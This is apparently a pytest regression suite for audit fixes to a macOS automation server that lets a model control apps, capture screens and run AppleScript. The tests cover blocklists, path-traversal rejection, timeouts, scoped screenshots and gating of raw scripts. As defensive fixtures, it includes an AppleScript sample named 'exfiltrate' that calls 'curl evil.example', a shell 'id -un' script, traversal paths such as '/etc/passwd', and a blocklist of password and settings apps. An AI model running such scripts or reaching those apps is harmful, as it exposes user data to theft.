#!/usr/bin/env python3
"""Regression tests for the 2026-07-27 audit fixes.

Hermetic: no real input is fired, no app is launched, nothing is captured.
Every test here pins a specific finding so a later change that undoes the fix
fails loudly instead of quietly.

Run: .venv/bin/python -m pytest test_audit_fixes.py -v
"""

from pathlib import Path

import pytest

import server


# -- A-006: blocklist matched display names only, so it lapsed on non-English Macs --

@pytest.mark.parametrize("name, bundle", [
    ("System Settings", "com.apple.systempreferences"),      # English
    ("Réglages Système", "com.apple.systempreferences"),     # French
    ("Systemeinstellungen", "com.apple.systempreferences"),  # German
    ("システム設定", "com.apple.systempreferences"),           # Japanese
    ("1Password", "com.1password.1password7"),
    ("Passwords", "com.apple.Passwords"),
])
def test_blocklisted_apps_are_refused_in_any_locale(name, bundle):
    assert server.blocklist_hit(name, bundle) is not None


def test_benign_apps_are_not_blocked():
    assert server.blocklist_hit("TextEdit", "com.apple.TextEdit") is None
    assert server.blocklist_hit("Finder", "com.apple.finder") is None


# -- A-011: _app_url built paths from the caller's name, so "/" and ".." escaped --

@pytest.mark.parametrize("name", [
    "/tmp/Evil",                     # absolute: Path("/Applications") / "/tmp/x" -> /tmp/x
    "../../../../tmp/Evil",          # dot-dot traversal
    "../Users/Marty/Downloads/Evil",
    "Utilities/../../../tmp/Evil",
    "~/Downloads/Evil",
])
def test_app_launch_rejects_paths(name):
    assert server._app_url(name) is None


def test_app_url_still_resolves_a_real_bundle_id():
    # com.apple.finder is present on every Mac; the guard must not break the
    # legitimate bundle-id branch.
    assert server._app_url("com.apple.finder") is not None


# -- A-016: osa() accepted any caller timeout, wedging a single-threaded server --

def test_osa_timeout_is_bounded(monkeypatch):
    seen = {}

    def fake_run(argv, **kw):
        seen.update(kw)
        raise AssertionError("stop before executing")

    monkeypatch.setattr(server.subprocess, "run", fake_run)
    with pytest.raises(AssertionError):
        server.osa("on run argv\nend run\n", [], timeout=10**9)
    assert seen["timeout"] == server.MAX_OSA_TIMEOUT


def test_osa_uses_an_absolute_binary_path(monkeypatch):
    seen = {}

    def fake_run(argv, **kw):
        seen["argv"] = argv
        raise AssertionError("stop before executing")

    monkeypatch.setattr(server.subprocess, "run", fake_run)
    with pytest.raises(AssertionError):
        server.osa("on run argv\nend run\n", [])
    assert seen["argv"][0] == "/usr/bin/osascript"
    assert Path(seen["argv"][0]).is_absolute()


# -- A-004: every applescript audit line read "on run argv" and nothing else --

def test_script_fingerprint_distinguishes_scripts():
    clipboard = 'on run argv\n\treturn (the clipboard as text)\nend run\n'
    exfiltrate = 'on run argv\n\tdo shell script "curl evil.example"\nend run\n'
    a, b = server._script_fingerprint(clipboard), server._script_fingerprint(exfiltrate)
    assert a != b, "two different scripts must not share an audit fingerprint"
    assert "on run argv" not in a, "the handler line carries no information"
    assert a.startswith("sha256:")
    # The body line is what tells a reader what happened.
    assert "clipboard" in a and "shell script" in b


def test_script_fingerprint_is_stable_and_survives_empty_input():
    s = 'on run argv\n\treturn 1\nend run\n'
    assert server._script_fingerprint(s) == server._script_fingerprint(s)
    assert server._script_fingerprint("").startswith("sha256:")


# -- A-002 / A-003: vision fell back to a silent full-screen grab and left files --

def test_scoped_capture_refuses_rather_than_grabbing_the_whole_screen(monkeypatch):
    """An app with no findable window must yield no image, not the desktop."""
    monkeypatch.setattr(server.Quartz, "CGPreflightScreenCaptureAccess", lambda: True)
    monkeypatch.setattr(server, "_window_id", lambda running: None)

    def fail_if_called(*a, **kw):
        raise AssertionError("screencapture must not run unscoped for a named app")

    monkeypatch.setattr(server.subprocess, "run", fail_if_called)

    class FakeApp:
        def processIdentifier(self): return 4242
        def localizedName(self): return "Notes"

    png, err = server._screenshot(FakeApp())
    assert png is None
    assert "no identifiable on-screen window" in err
    assert "whole-screen capture was NOT substituted" in err


def test_capture_reports_missing_permission_distinctly(monkeypatch):
    monkeypatch.setattr(server.Quartz, "CGPreflightScreenCaptureAccess", lambda: False)
    png, err = server._screenshot(None)
    assert png is None and "Screen Recording permission" in err


def test_capture_removes_its_temp_directory(monkeypatch, tmp_path):
    """The PNG is read into memory and the directory is gone before returning."""
    monkeypatch.setattr(server.Quartz, "CGPreflightScreenCaptureAccess", lambda: True)
    made = {}

    def fake_mkdtemp(prefix=""):
        d = tmp_path / "shot-dir"
        d.mkdir()
        made["dir"] = d
        return str(d)

    def fake_run(argv, **kw):
        Path(argv[-1]).write_bytes(b"\x89PNG\r\n\x1a\n" + b"x" * 64)
        class P: stderr = b""
        return P()

    monkeypatch.setattr(server.tempfile, "mkdtemp", fake_mkdtemp)
    monkeypatch.setattr(server.subprocess, "run", fake_run)

    png, err = server._screenshot(None)
    assert err is None and png.startswith(b"\x89PNG")
    assert not made["dir"].exists(), "the capture must not be left on disk"


# -- A-007 / A-008: raw xy was unbounded; a dead ref fell back to stale coords --

def test_xy_outside_the_target_windows_is_refused(monkeypatch):
    monkeypatch.setattr(server, "_window_rects", lambda pid: [(0.0, 0.0, 800.0, 600.0)])
    with pytest.raises(ValueError, match="outside every window"):
        server._resolve_point({"xy": [1500, 900]}, 4242, "ref", "xy")


def test_xy_inside_the_target_window_is_allowed(monkeypatch):
    monkeypatch.setattr(server, "_window_rects", lambda pid: [(0.0, 0.0, 800.0, 600.0)])
    assert server._resolve_point({"xy": [400, 300]}, 4242, "ref", "xy") == (400.0, 300.0)


def test_dead_ref_does_not_fall_back_to_cached_coordinates(monkeypatch):
    server._REFS["e999"] = {"el": object(), "pid": 4242, "app": "x", "center": (10.0, 10.0)}
    monkeypatch.setattr(server, "_center", lambda el: None)  # element is gone
    try:
        with pytest.raises(ValueError, match="no longer has an on-screen position"):
            server._resolve_point({"ref": "e999"}, 4242, "ref", "xy")
    finally:
        server._REFS.pop("e999", None)


def test_ref_belonging_to_another_pid_is_refused():
    server._REFS["e998"] = {"el": object(), "pid": 1, "app": "x", "center": (5.0, 5.0)}
    try:
        with pytest.raises(ValueError, match="belongs to pid"):
            server._resolve_point({"ref": "e998"}, 4242, "ref", "xy")
    finally:
        server._REFS.pop("e998", None)


# -- A-017: _REFS grew for the life of the process --

def test_ref_cache_is_bounded(monkeypatch):
    monkeypatch.setattr(server, "MAX_REFS", 50)
    before = len(server._REFS)
    for _ in range(500):
        server._new_ref(object(), 4242, "boundstest", (1.0, 1.0))
    assert len(server._REFS) <= 50 + before + 1


# -- A-015: app() returned on an unknown action without writing an audit line --

def test_unknown_app_action_is_audited(monkeypatch):
    lines = []
    monkeypatch.setattr(server, "audit", lambda *a: lines.append(a))
    result = server.app(action="frobnicate", name="TextEdit")
    assert result["ok"] is False
    assert lines, "every app() call must leave an audit line"


# -- A-001: the model-facing capability description must not understate applescript --

def test_instructions_do_not_claim_the_server_cannot_run_shell_commands():
    text = server.mcp.instructions
    # The original sentence claimed the whole server could not reach the shell.
    assert "does not read or write files and does not run shell commands." not in text
    # It must say who authors the code and that raw text is gated.
    assert "scripts the user wrote" in text
    assert "refused unless the user has explicitly enabled it" in text


def test_applescript_docstring_states_who_authors_the_code():
    doc = server.applescript.__doc__ or ""
    assert "do shell script" in doc
    assert "allow_raw_applescript" in doc


# -- A-001 redesign: the model picks a script, the user writes it --

def test_raw_script_text_is_refused_by_default(monkeypatch):
    monkeypatch.setitem(server.CONFIG, "allow_raw_applescript", False)
    called = []
    monkeypatch.setattr(server, "osa", lambda *a, **k: called.append(a) or {})
    result = server.applescript(script='on run argv\n\tdo shell script "id -un"\nend run\n')
    assert result["ok"] is False
    assert "raw AppleScript is disabled" in result["error"]
    assert not called, "a refused script must never reach osascript"


def test_raw_script_refusal_is_audited(monkeypatch):
    monkeypatch.setitem(server.CONFIG, "allow_raw_applescript", False)
    lines = []
    monkeypatch.setattr(server, "audit", lambda *a: lines.append(a))
    server.applescript(script='on run argv\n\treturn 1\nend run\n')
    assert lines and "refused" in lines[-1][-1]


def test_raw_script_runs_when_the_user_has_enabled_it(monkeypatch):
    monkeypatch.setitem(server.CONFIG, "allow_raw_applescript", True)
    monkeypatch.setattr(server, "osa",
                        lambda *a, **k: {"exit_code": 0, "stdout": "ran", "stderr": ""})
    result = server.applescript(script='on run argv\n\treturn 1\nend run\n')
    assert result["ok"] is True and result["stdout"] == "ran"


def test_named_script_runs_and_is_labelled_by_name(monkeypatch):
    seen = {}
    monkeypatch.setattr(server, "osa",
                        lambda text, args, **k: seen.update(text=text, args=args)
                        or {"exit_code": 0, "stdout": "x", "stderr": ""})
    lines = []
    monkeypatch.setattr(server, "audit", lambda *a: lines.append(a))
    result = server.applescript(name="echo-argv", args=["hello"])
    assert result["ok"] is True
    assert "on run argv" in seen["text"], "the file's text should reach osascript"
    assert seen["args"] == ["hello"]
    assert lines[-1][1] == "script:echo-argv"


@pytest.mark.parametrize("name", [
    "../server", "/etc/passwd", "~/secret", "sub/dir", "..", "nope\\evil",
])
def test_named_script_rejects_paths(name):
    text, error = server._named_script(name)
    assert text is None and error


def test_unknown_script_name_lists_the_catalogue():
    result = server.applescript(name="does-not-exist")
    assert result["ok"] is False
    assert "no script named" in result["error"]
    assert "echo-argv" in result["scripts"]


def test_bare_call_returns_the_catalogue():
    result = server.applescript()
    assert result["ok"] is True
    for expected in ("echo-argv", "clipboard-read", "clipboard-write"):
        assert expected in result["scripts"]
    assert result["raw_allowed"] is False


def test_shipped_scripts_all_declare_an_argv_handler():
    names = server._script_catalogue()
    assert names, "the catalogue must not be empty"
    for n in names:
        text, error = server._named_script(n)
        assert error is None
        assert "on run argv" in text, f"{n} must take its values as argv"
